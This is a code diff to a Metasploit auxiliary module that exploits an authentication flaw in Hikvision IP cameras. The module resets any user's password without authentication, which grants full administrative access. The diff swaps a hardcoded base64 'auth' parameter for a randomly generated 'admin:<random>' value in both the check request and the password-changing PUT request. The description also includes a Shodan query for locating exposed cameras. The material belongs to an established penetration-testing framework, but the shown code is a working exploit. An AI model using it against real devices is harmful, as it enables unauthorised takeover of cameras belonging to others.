@@ -7,14 +7,15 @@ class MetasploitModule < Msf::Auxiliary
 
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
+  require 'base64'
 
   def initialize(info = {})
     super(
       update_info(
         info,
-        'Name' => 'Hikvision IP Camera Unauthenticated Password Change Via Backdoor Creds',
+        'Name' => 'Hikvision IP Camera Unauthenticated Password Change Via Improper Authentication Logic',
         'Description' => %q{
-          Many Hikvision IP cameras contain a backdoor credentials that allow unauthenticated impersonation of any configured user account.
+          Many Hikvision IP cameras contain improper authentication logic which allows unauthenticated impersonation of any configured user account.
           The vulnerability has been present in Hikvision products since 2014. In addition to Hikvision-branded devices, it
           affects many white-labeled camera products sold under a variety of brand names.
 
@@ -22,7 +23,7 @@ class MetasploitModule < Msf::Auxiliary
           of publishing (shodan search: '"App-webs" "200 OK"'). Some of these devices can never be patched due to to the
           vendor preventing users from upgrading the installed firmware on the affected device.
 
-          This module utilizes these backdoor crednetials to perform an unauthenticated password change of any user account on
+          This module utilizes the bug in the authentication logic to perform an unauthenticated password change of any user account on
           a vulnerable Hikvision IP Camera. This can then be utilized to gain full administrative access to the affected device.
         },
         'License' => MSF_LICENSE,
@@ -92,11 +93,13 @@ class MetasploitModule < Msf::Auxiliary
 
   def check
     begin
+      password = Rex::Text.rand_text_alphanumeric(6..12)
+      auth = Base64.encode64("admin:#{password}")
       res = send_request_cgi({
         'method' => 'GET',
         'uri' => normalize_uri(target_uri.path, 'Security', 'users'),
         'vars_get' => {
-          'auth' => 'YWRtaW46MTEK'
+          'auth' => auth.strip
         }
       })
     rescue StandardError => e
@@ -128,11 +131,13 @@ class MetasploitModule < Msf::Auxiliary
       print_status("Starting the password reset for #{datastore['USERNAME']}...")
       post_data = %(<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">\r\n<id>#{datastore['ID'].to_s.encode(xml: :text)}</id>\r\n<userName>#{datastore['USERNAME']&.encode(xml: :text)}</userName>\r\n<password>#{datastore['PASSWORD']&.encode(xml: :text)}</password>\r\n</User>)
 
+      password = Rex::Text.rand_text_alphanumeric(6..12)
+      auth = Base64.encode64("admin:#{password}")
       res = send_request_cgi({
         'method' => 'PUT',
         'uri' => normalize_uri(target_uri.path, 'Security', 'users'),
         'vars_get' => {
-          'auth' => 'YWRtaW46MTEK'
+          'auth' => auth.strip
         },
         'ctype' => 'application/xml',
         'data' => post_data
